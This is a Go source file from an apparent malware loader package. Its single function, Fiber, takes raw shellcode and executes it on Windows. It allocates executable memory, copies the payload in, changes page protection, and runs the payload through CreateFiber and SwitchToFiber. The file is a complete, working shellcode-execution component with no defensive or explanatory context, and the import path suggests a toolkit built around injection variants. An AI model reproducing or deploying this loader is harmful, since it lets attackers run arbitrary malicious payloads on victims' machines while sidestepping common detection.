package loader

import (
	"fmt"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func Fiber(shellcode []byte) error {
	fiberAddr, ctErr := xwindows.ConvertThreadToFiber(0)
	if ctErr != nil {
		return fmt.Errorf("ConvertThreadToFiber failed: %w", ctErr)
	}

	addr, vaErr := xwindows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %v", vaErr)
	}

	rcErr := xwindows.RtlCopyMemory(
		unsafe.Pointer(addr),
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
	)
	if rcErr != nil {
		return fmt.Errorf("RtlCopyMemory failed: %v", rcErr)
	}

	var oldProtect uint32
	_, vpErr := xwindows.VirtualProtect(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if vpErr != nil {
		return fmt.Errorf("VirtualProtect failed: %v", vpErr)
	}

	fiber, cfErr := xwindows.CreateFiber(0, addr, 0)
	if cfErr != nil {
		return fmt.Errorf("CreateFiber failed: %v", cfErr)
	}

	_, sfErr := xwindows.SwitchToFiber(fiber)
	if sfErr != nil {
		return fmt.Errorf("SwitchToFiber failed: %v", sfErr)
	}

	_, sfAddrErr := xwindows.SwitchToFiber(fiberAddr)
	if sfAddrErr != nil {
		return fmt.Errorf("SwitchToFiber addr failed: %v", sfAddrErr)
	}

	return nil
}
